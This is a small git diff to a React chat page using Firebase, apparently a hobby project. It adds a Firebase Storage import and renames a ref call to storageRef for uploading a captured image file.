@@ -20,6 +20,8 @@ import {
 
 import { database, storage } from "../config/firebase";
 import { ref as databaseRef, push, update,get,set ,onValue,serverTimestamp } from "firebase/database";
+
+import { ref as storageRef, uploadBytes, getDownloadURL } from "firebase/storage";
 const ChatPage = () => {
   const [currentUser] = useState("Topik"); // Gantilah dengan ID pengguna yang sesuai
   const [chatWith] = useState("Winda"); // ID pengguna tujuan
@@ -255,7 +257,7 @@ useEffect(() => {
       stream.getTracks().forEach((track) => track.stop());
 
       // ========== 2. Upload ke Firebase Storage ==========
-      const fileRef = ref(storage, `user_captures/${currentUser}_online.png`);
+      const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
       await uploadString(fileRef, imageData, "data_url");
       const downloadURL = await getDownloadURL(fileRef);
 
